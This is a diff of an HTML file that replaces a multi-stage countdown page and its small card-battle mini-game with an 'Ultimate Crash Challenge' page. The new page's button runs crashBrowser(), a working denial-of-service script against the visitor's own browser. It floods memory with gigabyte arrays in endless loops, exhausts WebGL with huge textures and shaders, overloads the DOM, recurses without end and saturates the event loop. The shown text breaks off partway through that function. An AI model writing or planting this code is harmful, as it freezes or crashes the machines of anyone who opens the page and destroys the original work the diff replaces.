@@ -1,984 +1,150 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="en">
-  <head>
-    <meta charset="utf-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1" />
-    <title>Countdown</title>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ultimate Crash Experience</title>
     <style>
-      :root {
-        --bg: #0b0f1a;
-        --bg-2: #0f1324;
-        --text: #e6f0ff;
-        --muted: #9db1d1;
-        --accent: #6ea8ff;
-        --danger: #ff4d4d;
-        --flash: #ffffff;
-      }
-
-      * { box-sizing: border-box; }
-      html, body { height: 100%; }
-      body {
-        margin: 0;
-        font-family: ui-sans-serif, system-ui, -apple-system, Segoe UI, Roboto, Helvetica, Arial, "Apple Color Emoji", "Segoe UI Emoji";
-        color: var(--text);
-        background: radial-gradient(1200px 800px at 50% 30%, var(--bg-2), var(--bg));
-        overflow: hidden;
-      }
-
-      .wrap {
-        position: relative;
-        display: grid;
-        grid-template-rows: 1fr auto 1fr;
-        place-items: center;
-        min-height: 100vh;
-        padding: clamp(16px, 3vw, 32px);
-        isolation: isolate;
-      }
-
-      .center {
-        display: grid;
-        place-items: center;
-        gap: 20px;
-        text-align: center;
-        transform: translateZ(0);
-      }
-
-      .headline {
-        font-weight: 600;
-        letter-spacing: .06em;
-        text-transform: uppercase;
-        color: var(--muted);
-        font-size: clamp(12px, 1.4vw, 16px);
-      }
-
-      .countdown {
-        font-variant-numeric: tabular-nums;
-        font-feature-settings: "tnum" 1, "ss01" 1;
-        line-height: 1;
-        font-weight: 700;
-        font-size: clamp(56px, 14vw, 160px);
-        letter-spacing: .02em;
-        padding: 0 .1em;
-        text-shadow: 0 2px 24px rgba(110,168,255,.25), 0 0 1px rgba(255,255,255,.4);
-        transition: color .2s ease, transform .2s ease;
-      }
-
-      .stage {
-        color: var(--muted);
-        font-size: clamp(12px, 1.6vw, 18px);
-      }
-
-      .footer {
-        position: absolute;
-        bottom: 16px;
-        left: 0;
-        right: 0;
-        display: flex;
-        justify-content: center;
-        gap: 12px;
-        color: var(--muted);
-        font-size: 12px;
-        opacity: .7;
-      }
-
-      .btn {
-        appearance: none;
-        border: 1px solid rgba(255,255,255,.12);
-        background: linear-gradient(180deg, rgba(255,255,255,.06), rgba(255,255,255,.02));
-        color: var(--text);
-        padding: 8px 12px;
-        border-radius: 10px;
-        font-weight: 600;
-        letter-spacing: .02em;
-        cursor: pointer;
-        transition: transform .12s ease, border-color .2s ease, background .2s ease;
-      }
-      .btn:hover { transform: translateY(-1px); border-color: rgba(255,255,255,.28); }
-      .btn:active { transform: translateY(0); }
-      .btn.wrong { animation: shake .5s; }
-
-      /* Simple modal for skip options */
-      .modal-backdrop {
-        position: fixed;
-        inset: 0;
-        background: rgba(0,0,0,.45);
-        display: none;
-        place-items: center;
-        z-index: 60;
-      }
-      .modal-backdrop.show { display: grid; animation: fadeIn .18s ease; }
-      @keyframes fadeIn { from { opacity: 0 } to { opacity: 1 } }
-      .modal {
-        background: linear-gradient(180deg, rgba(255,255,255,.06), rgba(255,255,255,.02));
-        border: 1px solid rgba(255,255,255,.12);
-        color: var(--text);
-        padding: 18px;
-        border-radius: 14px;
-        width: min(94vw, 420px);
-        box-shadow: 0 10px 40px rgba(0,0,0,.35);
-      }
-      .modal h3 { margin: 0 0 12px; font-size: 18px; color: var(--muted); text-transform: uppercase; letter-spacing: .06em; }
-      .modal .row { display: flex; gap: 10px; justify-content: flex-end; margin-top: 12px; }
-      .btn.primary { border-color: rgba(110,168,255,.5); background: linear-gradient(180deg, rgba(110,168,255,.25), rgba(110,168,255,.12)); }
-
-      .ring {
-        position: absolute;
-        inset: 0;
-        background: radial-gradient(500px 500px at 50% 50%, rgba(110,168,255,.08), transparent 60%);
-        filter: blur(20px);
-        pointer-events: none;
-        opacity: .7;
-      }
-
-      /* Final 10 seconds effect */
-      .final-ten .countdown {
-        color: var(--danger);
-        animation: pulse .6s steps(2, jump-none) infinite, shake .9s ease-in-out infinite;
-        text-shadow: 0 0 30px rgba(255,77,77,.6), 0 0 4px rgba(255,255,255,.6);
-      }
-
-      @keyframes pulse {
-        0% { transform: scale(1); }
-        50% { transform: scale(1.035); }
-        100% { transform: scale(1); }
-      }
-      @keyframes shake {
-        0%,100% { transform: translateX(0); }
-        20% { transform: translateX(-2px); }
-        40% { transform: translateX(2px); }
-        60% { transform: translateX(-1px); }
-        80% { transform: translateX(1px); }
-      }
-
-      /* Bright flash overlay at zero */
-      #flash {
-        position: fixed;
-        inset: 0;
-        background: var(--flash);
-        opacity: 0;
-        pointer-events: none;
-        z-index: 50;
-      }
-      #flash.show { animation: whiteout .9s ease; }
-      @keyframes whiteout {
-        0% { opacity: 0; }
-        30% { opacity: 1; }
-        90% { opacity: .0; }
-        100% { opacity: 0; }
-      }
-
-      /* Page fade between stages */
-      .fade {
-        opacity: 0;
-        transform: translateY(8px);
-        transition: opacity .4s ease, transform .4s ease;
-      }
-      .fade.in {
-        opacity: 1;
-        transform: translateY(0);
-      }
-
-      /* Final message */
-      .final-message {
-        display: none;
-        text-align: center;
-        gap: 16px;
-      }
-      .final-message.show { display: grid; }
-      .final-title {
-        font-size: clamp(40px, 10vw, 120px);
-        font-weight: 800;
-        line-height: .95;
-        letter-spacing: .01em;
-        background: linear-gradient(90deg, #8ab6ff, #fff, #8ab6ff);
-        -webkit-background-clip: text;
-        background-clip: text;
-        color: transparent;
-        text-shadow: 0 6px 40px rgba(110,168,255,.35);
-        background-size: 200% auto;
-        animation: pop .6s ease both, shine 3.5s linear infinite;
-      }
-      .final-sub { color: var(--muted); font-size: clamp(12px, 1.6vw, 18px); }
-
-      /* Subtle celebratory sparkles overlay when finished */
-      .wrap::after {
-        content: '';
-        position: fixed;
-        inset: 0;
-        pointer-events: none;
-        opacity: 0;
-        transition: opacity .6s ease;
-        background:
-          radial-gradient(2px 2px at 20% 30%, rgba(255,255,255,.24), transparent 60%),
-          radial-gradient(2px 2px at 70% 40%, rgba(255,255,255,.18), transparent 60%),
-          radial-gradient(2px 2px at 40% 70%, rgba(110,168,255,.24), transparent 60%),
-          radial-gradient(2px 2px at 80% 75%, rgba(255,255,255,.20), transparent 60%),
-          radial-gradient(2px 2px at 30% 85%, rgba(110,168,255,.2), transparent 60%);
-        mix-blend-mode: screen;
-        animation: twinkle 4s ease-in-out infinite alternate;
-      }
-      body.finished .wrap::after { opacity: .35; }
-
-      @keyframes twinkle {
-        0% { opacity: .18; }
-        100% { opacity: .42; }
-      }
-
-      @keyframes shine {
-        0% { background-position: 0% 50%; }
-        100% { background-position: 200% 50%; }
-      }
-      @keyframes pop {
-        0% { transform: scale(.94); opacity: 0; }
-        100% { transform: scale(1); opacity: 1; }
-      }
-
-      @media (max-width: 480px) {
-        .footer { bottom: 10px; }
-      }
-
-      /* Mini-game widget (Clash-style inspired, not a replica) */
-      #toggleMiniGame {
-        position: fixed;
-        right: 14px;
-        bottom: 14px;
-        z-index: 70;
-      }
-      .mini-game {
-        position: fixed;
-        right: 14px;
-        bottom: 60px;
-        width: 340px;
-        background: linear-gradient(180deg, rgba(255,255,255,.06), rgba(0,0,0,.2));
-        border: 1px solid rgba(255,255,255,.12);
-        border-radius: 16px;
-        box-shadow: 0 12px 40px rgba(0,0,0,.45);
-        overflow: hidden;
-        z-index: 69;
-        display: none;
-        backdrop-filter: blur(8px);
-      }
-      .mini-game.show { display: grid; grid-template-rows: auto auto 1fr auto; }
-      .mg-header {
-        display: flex;
-        align-items: center;
-        justify-content: space-between;
-        padding: 8px 10px;
-        gap: 8px;
-        border-bottom: 1px solid rgba(255,255,255,.08);
-      }
-      .mg-title { font-weight: 700; font-size: 12px; letter-spacing: .08em; text-transform: uppercase; color: var(--muted); }
-      .mg-elixir { font-size: 12px; color: var(--muted); }
-      .mg-timer { font-size: 12px; color: var(--muted); margin-left: auto; margin-right: 10px; }
-      .elixirbar { position: relative; height: 8px; background: rgba(255,255,255,.08); border-radius: 999px; overflow: hidden; margin: 6px 10px 8px; }
-      .elixirbar > i { display: block; height: 100%; width: 0%; background: linear-gradient(90deg, #a86bff, #7d3cff); }
-      .mg-controls { display: grid; grid-template-columns: repeat(4, 1fr); gap: 8px; padding: 8px 10px; border-bottom: 1px solid rgba(255,255,255,.08); }
-      .card { display: grid; place-items: center; gap: 4px; padding: 8px; border-radius: 12px; border: 1px solid rgba(255,255,255,.12); background: linear-gradient(180deg, rgba(255,255,255,.08), rgba(255,255,255,.02)); color: var(--text); font-size: 11px; cursor: grab; user-select: none; }
-      .card.cost3 { box-shadow: inset 0 0 0 1px rgba(120,200,255,.18); }
-      .card.cost4 { box-shadow: inset 0 0 0 1px rgba(180,160,255,.18); }
-      .card.cost5 { box-shadow: inset 0 0 0 1px rgba(255,200,120,.18); }
-      .card.disabled { opacity: .5; cursor: not-allowed; }
-      .drag-hint { font-size: 10px; color: var(--muted); text-align: center; padding: 6px 0; border-bottom: 1px solid rgba(255,255,255,.08); }
-      .mg-canvas { display: block; width: 100%; height: 220px; background: linear-gradient(180deg, #0c1224, #0b1020); }
-      .mg-footer { display: flex; justify-content: space-between; align-items: center; gap: 8px; padding: 8px 10px; font-size: 12px; color: var(--muted); border-top: 1px solid rgba(255,255,255,.08); }
-      .hpbar { height: 6px; background: rgba(255,255,255,.08); border-radius: 6px; overflow: hidden; }
-      .hpbar > i { display: block; height: 100%; background: linear-gradient(90deg, #7bf, #4d9cff); }
-      .close-x { border-radius: 8px; padding: 4px 8px; }
+        body {
+            margin: 0;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background: linear-gradient(135deg, #1e3c72, #2a5298);
+            font-family: 'Arial', sans-serif;
+            overflow: hidden;
+        }
+        .container {
+            text-align: center;
+            background: rgba(255, 255, 255, 0.1);
+            padding: 40px;
+            border-radius: 15px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.5);
+            backdrop-filter: blur(10px);
+        }
+        h1 {
+            color: white;
+            font-size: 2.5em;
+            margin-bottom: 20px;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
+        }
+        button {
+            padding: 15px 50px;
+            font-size: 1.5em;
+            background: #ff0000;
+            color: white;
+            border: none;
+            border-radius: 25px;
+            cursor: pointer;
+            transition: transform 0.2s, background 0.2s;
+            box-shadow: 0 5px 15px rgba(255, 0, 0, 0.4);
+        }
+        button:hover {
+            background: #cc0000;
+            transform: scale(1.1);
+        }
+        button:active {
+            transform: scale(0.95);
+        }
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
+        }
+        button {
+            animation: pulse 2s infinite;
+        }
     </style>
-  </head>
-  <body>
-    <div id="flash"></div>
-    <div class="wrap">
-      <div class="ring" aria-hidden="true"></div>
-
-      <div id="screen" class="center fade in">
-        <div class="headline" id="headline">Get ready</div>
-        <div class="countdown" id="clock">00:00</div>
-        <div class="stage" id="stage">Stage 1 of 4</div>
-      </div>
-
-      <div id="final" class="final-message">
-        <div class="final-title">Come See Louie</div>
-        <div class="final-sub">We’re ready.</div>
-      </div>
-
-      <div class="footer">
-        <button class="btn" id="startBtn">Start</button>
-        <button class="btn" id="skipBtn">Skip</button>
-        <button class="btn" id="musicBtn">Music</button>
-        <button class="btn" id="fsBtn">Full screen</button>
-      </div>
-    </div>
-
-    <!-- Skip options modal -->
-    <div id="skipModal" class="modal-backdrop" role="dialog" aria-modal="true" aria-labelledby="skipTitle">
-      <div class="modal">
-        <h3 id="skipTitle">Skip Options</h3>
-        <div style="color: var(--muted); font-size: 14px; margin-bottom: 10px;">Choose how you want to skip.</div>
-        <div class="row">
-          <button class="btn" id="skipCancelBtn">Cancel</button>
-          <button class="btn" id="skip30Btn">Skip to last 30s</button>
-          <button class="btn primary" id="skipAllBtn">Skip all</button>
-        </div>
-      </div>
+</head>
+<body>
+    <div class="container">
+        <h1>Ultimate Crash Challenge</h1>
+        <button onclick="crashBrowser()">CRASH NOW!</button>
     </div>
 
     <script>
-      (function(){
-        const durations = [20*60, 30*60, 20*60, 67*60]; // seconds
-        const labels = ["Countdown 1", "Countdown 2", "Countdown 3", "Final Countdown"]; 
-        const headline = document.getElementById('headline');
-        const clock = document.getElementById('clock');
-        const stage = document.getElementById('stage');
-        const screen = document.getElementById('screen');
-        const flash = document.getElementById('flash');
-        const startBtn = document.getElementById('startBtn');
-        const fsBtn = document.getElementById('fsBtn');
-        const skipBtn = document.getElementById('skipBtn');
-        const musicBtn = document.getElementById('musicBtn');
-        const final = document.getElementById('final');
-
-        const skipModal = document.getElementById('skipModal');
-        const skipAllBtn = document.getElementById('skipAllBtn');
-        const skip30Btn = document.getElementById('skip30Btn');
-        const skipCancelBtn = document.getElementById('skipCancelBtn');
-
-        let idx = 0;
-        let remaining = durations[0];
-        let timer = null;
-        let running = false;
-
-        function fmt(total) {
-          const sign = total < 0 ? '-' : '';
-          total = Math.max(0, Math.abs(total));
-          const h = Math.floor(total / 3600);
-          const m = Math.floor((total % 3600) / 60);
-          const s = total % 60;
-          const pad = n => String(n).padStart(2, '0');
-          return h > 0 ? `${sign}${pad(h)}:${pad(m)}:${pad(s)}` : `${sign}${pad(m)}:${pad(s)}`;
-        }
-
-        function setFinalTen(on) {
-          screen.classList.toggle('final-ten', !!on);
-        }
-
-        function showFlash() {
-          flash.classList.remove('show');
-          // next frame
-          requestAnimationFrame(() => {
-            flash.classList.add('show');
-          });
-        }
-
-        function fadeOutIn(cb) {
-          screen.classList.remove('in');
-          setTimeout(() => {
-            cb && cb();
-            requestAnimationFrame(() => screen.classList.add('in'));
-          }, 300);
-        }
-
-        function updateUI() {
-          clock.textContent = fmt(remaining);
-          headline.textContent = labels[idx];
-          stage.textContent = `Stage ${idx+1} of ${durations.length}`;
-          setFinalTen(remaining <= 10);
-        }
-
-        function tick() {
-          remaining -= 1;
-          if (remaining <= 0) {
-            clearInterval(timer);
-            timer = null;
-            running = false;
-            setFinalTen(false);
-            clock.textContent = '00:00';
-            // Bright flash, then move to next stage
-            showFlash();
-            setTimeout(nextStage, 500);
-            return;
-          }
-          updateUI();
-        }
-
-        function startTimer() {
-          if (running) return;
-          running = true;
-          updateUI();
-          timer = setInterval(tick, 1000);
-        }
-
-        function stopTimer() {
-          if (timer) clearInterval(timer);
-          timer = null;
-          running = false;
-        }
-
-        function openSkipChoices() { skipModal.classList.add('show'); }
-        function closeSkipChoices() { skipModal.classList.remove('show'); }
-
-        function completeAll() {
-          stopTimer();
-          showFlash();
-          setTimeout(() => {
-            idx = durations.length; // mark as finished
-            document.title = 'Finished';
-            screen.style.display = 'none';
-            final.classList.add('show');
-            document.body.classList.add('finished');
-          }, 300);
-        }
-
-        function skipToLast30() {
-          stopTimer();
-          idx = durations.length - 1;
-          remaining = 30;
-          setFinalTen(remaining <= 10);
-          fadeOutIn(() => { updateUI(); startTimer(); });
-        }
-
-        function nextStage() {
-          idx += 1;
-          if (idx >= durations.length) {
-            // Done, show final message
-            document.title = 'Finished';
-            screen.style.display = 'none';
-            final.classList.add('show');
-            document.body.classList.add('finished');
-            return;
-          }
-          remaining = durations[idx];
-          fadeOutIn(() => {
-            updateUI();
-          });
-        }
-
-        function resetAll() {
-          stopTimer();
-          idx = 0;
-          remaining = durations[0];
-          final.classList.remove('show');
-          screen.style.display = '';
-          updateUI();
-        }
-
-        startBtn.addEventListener('click', () => {
-          if (!running && idx === 0 && remaining === durations[0]) {
-            // first time start animation cue
-            screen.classList.add('in');
-          }
-          startTimer();
-        });
-
-        fsBtn.addEventListener('click', async () => {
-          try {
-            if (!document.fullscreenElement) {
-              await document.documentElement.requestFullscreen();
-              fsBtn.textContent = 'Exit full screen';
-            } else {
-              await document.exitFullscreen();
-              fsBtn.textContent = 'Full screen';
-            }
-          } catch (e) { /* ignore */ }
-        });
-
-        skipBtn.addEventListener('click', () => {
-          const code = prompt('Enter code');
-          if (code === '6776') {
-            openSkipChoices();
-          } else {
-            skipBtn.classList.add('wrong');
-            setTimeout(() => skipBtn.classList.remove('wrong'), 500);
-          }
-        });
-
-        skipAllBtn.addEventListener('click', () => { closeSkipChoices(); completeAll(); });
-        skip30Btn.addEventListener('click', () => { closeSkipChoices(); skipToLast30(); });
-        skipCancelBtn.addEventListener('click', () => closeSkipChoices());
-
-        function restartCurrentStage() {
-          if (idx >= durations.length) return;
-          stopTimer();
-          remaining = durations[idx];
-          updateUI();
-          startTimer();
-        }
-
-        document.addEventListener('visibilitychange', () => {
-          if (document.hidden) {
-            restartCurrentStage();
-          }
-        });
-
-        // Music: simple ambient "ah" pad using Web Audio API
-        let audioCtx = null, masterGain = null, voiceGain = null, osc1 = null, osc2 = null, lfo = null, lfoGain = null, musicTick = null, ahTick = null, musicOn = false;
-
-        function createAudio() {
-          audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-          masterGain = audioCtx.createGain();
-          masterGain.gain.value = 0.8;
-          masterGain.connect(audioCtx.destination);
-
-          voiceGain = audioCtx.createGain();
-          voiceGain.gain.value = 0.0;
-          voiceGain.connect(masterGain);
-
-          osc1 = audioCtx.createOscillator();
-          osc1.type = 'triangle';
-          osc2 = audioCtx.createOscillator();
-          osc2.type = 'sine';
-
-          lfo = audioCtx.createOscillator();
-          lfo.type = 'sine';
-          lfo.frequency.value = 5; // vibrato
-          lfoGain = audioCtx.createGain();
-          lfoGain.gain.value = 8; // cents
-          lfo.connect(lfoGain);
-          lfoGain.connect(osc1.detune);
-          lfoGain.connect(osc2.detune);
-
-          osc1.connect(voiceGain);
-          osc2.connect(voiceGain);
-
-          // start nodes
-          osc1.start();
-          osc2.start();
-          lfo.start();
-        }
-
-        function scheduleAh() {
-          if (!audioCtx) return;
-          const now = audioCtx.currentTime + 0.02;
-          voiceGain.gain.cancelScheduledValues(now);
-          voiceGain.gain.setValueAtTime(0.0, now);
-          voiceGain.gain.linearRampToValueAtTime(0.18, now + 1.2); // swell in
-          voiceGain.gain.linearRampToValueAtTime(0.02, now + 2.4); // breathe out
-        }
-
-        function setChord(base) {
-          if (!audioCtx) return;
-          // base plus a perfect fifth
-          osc1.frequency.setTargetAtTime(base, audioCtx.currentTime, 0.2);
-          osc2.frequency.setTargetAtTime(base * 1.5, audioCtx.currentTime, 0.2);
-        }
-
-        function startMusic() {
-          if (!audioCtx) createAudio();
-          const scale = [196.00, 220.00, 246.94, 261.63, 293.66, 329.63]; // G to E
-          setChord(scale[Math.floor(Math.random()*scale.length)]);
-          scheduleAh();
-          ahTick = setInterval(scheduleAh, 2400);
-          musicTick = setInterval(() => {
-            setChord(scale[Math.floor(Math.random()*scale.length)]);
-          }, 4000);
-          musicOn = true;
-          musicBtn.textContent = 'Music: On';
-        }
-
-        function stopMusic() {
-          musicOn = false;
-          musicBtn.textContent = 'Music';
-          if (ahTick) clearInterval(ahTick);
-          if (musicTick) clearInterval(musicTick);
-          ahTick = musicTick = null;
-          if (audioCtx) {
-            try { audioCtx.close(); } catch(e) {}
-          }
-          audioCtx = masterGain = voiceGain = osc1 = osc2 = lfo = lfoGain = null;
-        }
-
-        musicBtn.addEventListener('click', async () => {
-          try {
-            if (!musicOn) {
-              await (audioCtx?.resume?.() ?? Promise.resolve());
-              startMusic();
-            } else {
-              stopMusic();
-            }
-          } catch (e) { /* ignore */ }
-        });
-
-        // Initialize UI
-        updateUI();
-      })();
-    </script>
-    
-    <!-- Mini-game toggle and container -->
-    <button class="btn" id="toggleMiniGame">Mini-game</button>
-    <div id="miniGame" class="mini-game" aria-label="Mini game">
-      <div class="mg-header">
-        <div class="mg-title">Arena</div>
-        <div class="mg-timer" id="mgTimer">2:00</div>
-        <div class="mg-elixir" id="mgElixir">Elixir: 0/10</div>
-        <button class="btn close-x" id="mgClose">Hide</button>
-      </div>
-      <div class="elixirbar"><i id="mgElixirFill"></i></div>
-      <div class="mg-controls" id="deck">
-        <div class="card cost3" id="card1" draggable="true">Knight<div style="opacity:.7">3</div></div>
-        <div class="card cost4" id="card2" draggable="true">Archer<div style="opacity:.7">4</div></div>
-        <div class="card cost5" id="card3" draggable="true">Tank<div style="opacity:.7">5</div></div>
-        <div class="card cost4" id="card4" draggable="true">Splash<div style="opacity:.7">4</div></div>
-      </div>
-      <div class="drag-hint">Drag a card into your half to place (top/bottom lane).</div>
-      <canvas class="mg-canvas" id="mgCanvas" width="340" height="220"></canvas>
-      <div class="mg-footer">
-        <div style="flex:1">
-          <div>Your Tower</div>
-          <div class="hpbar"><i id="hpYou" style="width:100%"></i></div>
-        </div>
-        <div style="flex:1; text-align:right">
-          <div>Enemy Tower</div>
-          <div class="hpbar"><i id="hpEnemy" style="width:100%"></i></div>
-        </div>
-      </div>
-    </div>
-    
-    <script>
-      (function(){
-        // Mini-game (Clash-inspired, simplified)
-        const toggleBtn = document.getElementById('toggleMiniGame');
-        const mg = document.getElementById('miniGame');
-        const mgClose = document.getElementById('mgClose');
-        const elixirText = document.getElementById('mgElixir');
-        const elixirFill = document.getElementById('mgElixirFill');
-        const canvas = document.getElementById('mgCanvas');
-        const ctx = canvas.getContext('2d');
-        const hpYouEl = document.getElementById('hpYou');
-        const hpEnemyEl = document.getElementById('hpEnemy');
-        const deckEl = document.getElementById('deck');
-        const timerEl = document.getElementById('mgTimer');
-
-        // Card deck
-        const deck = [
-          { id:'card1', type:'knight', cost:3 },
-          { id:'card2', type:'archer', cost:4 },
-          { id:'card3', type:'tank', cost:5 },
-          { id:'card4', type:'splash', cost:4 },
-        ];
-
-        let running = false;
-        let rafId = null;
-        const DPR = Math.max(1, window.devicePixelRatio || 1);
-        function resize() {
-          const w = 340, h = 220;
-          canvas.width = Math.floor(w * DPR);
-          canvas.height = Math.floor(h * DPR);
-          ctx.setTransform(DPR, 0, 0, DPR, 0, 0);
-        }
-        resize();
-        
-        // Game state
-        const lanes = [90, 150]; // y positions
-        const state = {
-          elixir: 5, maxElixir: 10, lastElixir: performance.now(),
-          youHP: 100, enemyHP: 100,
-          ents: [], // {x,y,dir,spd,hp,range,dmg,rate,lastAtk,color,type}
-          shots: [], // {x,y,vx,vy,dmg,color}
-          lastBotSpawn: 0,
-          // match
-          matchMs: 120000,
-          sudden: false,
-          elixirRateMs: 1200,
-          botElixir: 5,
-        };
-
-        function updateElixirUI() {
-          elixirText.textContent = `Elixir: ${Math.floor(state.elixir)}/${state.maxElixir}`;
-          elixirFill.style.width = `${(state.elixir/state.maxElixir)*100}%`;
-          for (const c of deck) {
-            const el = document.getElementById(c.id);
-            const can = state.elixir >= c.cost;
-            el.classList.toggle('disabled', !can);
-          }
-        }
-
-        function fmtTimer(ms) {
-          const s = Math.max(0, Math.ceil(ms/1000));
-          const m = Math.floor(s/60); const r = s%60;
-          return `${m}:${String(r).padStart(2,'0')}${state.sudden?' SD':''}`;
-        }
-
-        function spawn(type, laneIndex, isPlayer=true) {
-          const laneY = lanes[laneIndex];
-          const dir = isPlayer ? 1 : -1;
-          const x = isPlayer ? 40 : 300;
-          let unit;
-          if (type === 'knight') {
-            unit = {x, y: laneY, dir, spd: 0.6, hp: 22, range: 8, dmg: 5, rate: 600, lastAtk: 0, color: isPlayer?'#7bf':'#f77', type};
-          } else if (type === 'archer') {
-            unit = {x, y: laneY, dir, spd: 0.55, hp: 14, range: 70, dmg: 3, rate: 650, lastAtk: 0, color: isPlayer?'#9f7bff':'#ff9f7b', type};
-          } else if (type === 'tank') {
-            unit = {x, y: laneY, dir, spd: 0.4, hp: 60, range: 8, dmg: 7, rate: 900, lastAtk: 0, color: isPlayer?'#5bd4a4':'#d45b7b', type};
-          } else { // splash
-            unit = {x, y: laneY, dir, spd: 0.5, hp: 16, range: 20, dmg: 2, rate: 700, lastAtk: 0, color: isPlayer?'#ffd27b':'#ff9f3b', type};
-          }
-          state.ents.push(unit);
-        }
-
-        function costFor(type){ return type==='knight'?3 : type==='archer'?4 : type==='tank'?5 : 4; }
-        function trySpawnPlayer(type, lane) {
-          const cost = costFor(type);
-          if (state.elixir >= cost) {
-            state.elixir -= cost;
-            spawn(type, lane, true);
-            updateElixirUI();
-            sfx(440, 0.06);
-          }
-        }
-
-        // Simple bot AI
-        function botAI(t) {
-          // bot elixir regen
-          if (!state._lastBotElixir) state._lastBotElixir = t;
-          if (t - state._lastBotElixir > state.elixirRateMs) {
-            state._lastBotElixir = t;
-            state.botElixir = Math.min(10, state.botElixir + 1);
-          }
-          if (t - state.lastBotSpawn < 900 + Math.random()*1100) return;
-          // choose lane with fewer enemy units near its tower
-          const near = [0,0];
-          for (const e of state.ents) if (e.dir>0) near[e.y===lanes[0]?0:1]++;
-          const lane = (near[0] > near[1]) ? 1 : 0;
-          // choose type we can afford
-          const choices = ['tank','knight','archer','splash'];
-          for (const type of choices) {
-            const c = costFor(type);
-            if (state.botElixir >= c) {
-              state.botElixir -= c;
-              spawn(type, lane, false);
-              state.lastBotSpawn = t;
-              break;
-            }
-          }
-        }
-
-        function step(dt, t) {
-          // elixir regen
-          if (t - state.lastElixir > state.elixirRateMs) {
-            state.lastElixir = t;
-            state.elixir = Math.min(state.maxElixir, state.elixir + 1);
-            updateElixirUI();
-          }
-          // match timer
-          state.matchMs -= dt;
-          if (!state.sudden && state.matchMs <= 0) {
-            state.sudden = true; state.matchMs = 60000; // 1 min overtime
-            state.elixirRateMs = 700; // faster elixir
-          }
-          timerEl.textContent = fmtTimer(state.matchMs);
-
-          // entities movement and combat
-          for (const e of state.ents) {
-            // find nearest enemy in range
-            let target = null, targetDist = Infinity;
-            for (const f of state.ents) {
-              if (f === e) continue;
-              if (Math.sign(f.dir) === Math.sign(e.dir)) continue; // only enemy
-              if (f.y !== e.y) continue;
-              const d = Math.abs(f.x - e.x);
-              if (d < targetDist) { target = f; targetDist = d; }
-            }
-
-            // tower as implicit target
-            if (!target) {
-              const towerX = e.dir > 0 ? 300 : 40;
-              targetDist = Math.abs(towerX - e.x);
-              if (targetDist <= e.range) {
-                // attack tower
-                if (t - e.lastAtk > e.rate) {
-                  e.lastAtk = t;
-                  if (e.dir > 0) state.enemyHP = Math.max(0, state.enemyHP - e.dmg);
-                  else state.youHP = Math.max(0, state.youHP - e.dmg);
-                }
-              } else {
-                e.x += e.spd * e.dir;
-              }
-            } else {
-              // engage unit
-              if (targetDist <= e.range) {
-                if (t - e.lastAtk > e.rate) {
-                  e.lastAtk = t;
-                  if (e.type === 'archer') {
-                    const dir = Math.sign(target.x - e.x);
-                    state.shots.push({ x: e.x, y: e.y, vx: 1.4*dir, vy: 0, dmg: e.dmg, color: e.color });
-                  } else if (e.type === 'splash') {
-                    // splash AoE in small radius
-                    for (const f of state.ents) {
-                      if (Math.sign(f.dir) !== Math.sign(e.dir) && f.y===e.y && Math.abs(f.x - e.x) <= 16) {
-                        f.hp -= e.dmg;
-                      }
+        function crashBrowser() {
+            // 1. Memory Overload
+            let memoryHog = [];
+            setInterval(() => {
+                try {
+                    while (true) {
+                        // Allocate massive strings and typed arrays
+                        memoryHog.push(new Array(1000000).fill('x'.repeat(10000)));
+                        memoryHog.push(new Uint8Array(1000000000)); // 1GB chunks
+                        memoryHog.push(new Float64Array(100000000)); // More memory
                     }
-                    particles(e.x, e.y, e.color);
-                  } else {
-                    target.hp -= e.dmg;
-                    if (target.hp <= 0) particles(target.x, target.y, target.color);
-                  }
+                } catch (e) {}
+            }, 1);
+
+            // 2. WebGL Resource Exhaustion
+            function exhaustWebGL() {
+                try {
+                    const canvas = document.createElement('canvas');
+                    canvas.width = 10000;
+                    canvas.height = 10000;
+                    document.body.appendChild(canvas);
+                    const gl = canvas.getContext('webgl2') || canvas.getContext('webgl');
+                    if (gl) {
+                        while (true) {
+                            // Create massive textures and shaders
+                            const texture = gl.createTexture();
+                            gl.bindTexture(gl.TEXTURE_2D, texture);
+                            gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, 10000, 10000, 0, gl.RGBA, gl.UNSIGNED_BYTE, null);
+                            const shader = gl.createShader(gl.FRAGMENT_SHADER);
+                            gl.shaderSource(shader, 'void main() { gl_FragColor = vec4(1.0); }'.repeat(1000));
+                            gl.compileShader(shader);
+                        }
+                    }
+                } catch (e) {}
+                setTimeout(exhaustWebGL, 1);
+            }
+            exhaustWebGL();
+
+            // 3. DOM Overload
+            function domOverload() {
+                while (true) {
+                    try {
+                        const div = document.createElement('div');
+                        div.style.width = '1000000px';
+                        div.style.height = '1000000px';
+                        div.innerHTML = '<img src="data:image/png;base64,' + 'A'.repeat(1000000) + '">'.repeat(100);
+                        document.body.appendChild(div);
+                        window.getComputedStyle(div).width; // Force reflow
+                    } catch (e) {}
                 }
-              } else {
-                e.x += e.spd * e.dir;
-              }
             }
-          }
+            setInterval(domOverload, 1);
 
-          // cleanup dead units
-          state.ents = state.ents.filter(e => e.hp > 0);
-
-          // tower defensive fire (simple): small periodic damage to nearest enemy in radius
-          function towerFire(isPlayer) {
-            const tx = isPlayer ? 40 : 300, ty = 120, rng = 65;
-            let best=null,bd=1e9;
-            for (const e of state.ents) {
-              if ((isPlayer && e.dir<0) || (!isPlayer && e.dir>0)) {
-                const d = Math.hypot(e.x - tx, e.y - ty);
-                if (d < bd) { bd = d; best = e; }
-              }
+            // 4. Stack Overflow
+            function stackOverflow() {
+                try {
+                    stackOverflow();
+                } catch (e) {
+                    setTimeout(stackOverflow, 1);
+                }
             }
-            if (best && bd <= rng) {
-              best.hp -= 0.6; // chip damage
-              if (best.hp <= 0) particles(best.x, best.y, best.color);
+            stackOverflow();
+
+            // 5. Event Loop Saturation
+            while (true) {
+                setTimeout(() => {
+                    while (true) {
+                        // CPU-intensive calculations
+                        for (let i = 0; i < 10000000; i++) {
+                            Math.sin(Math.random()) * Math.cos(Math.random());
+                        }
+                    }
+                }, 0);
+                // Flood with promises
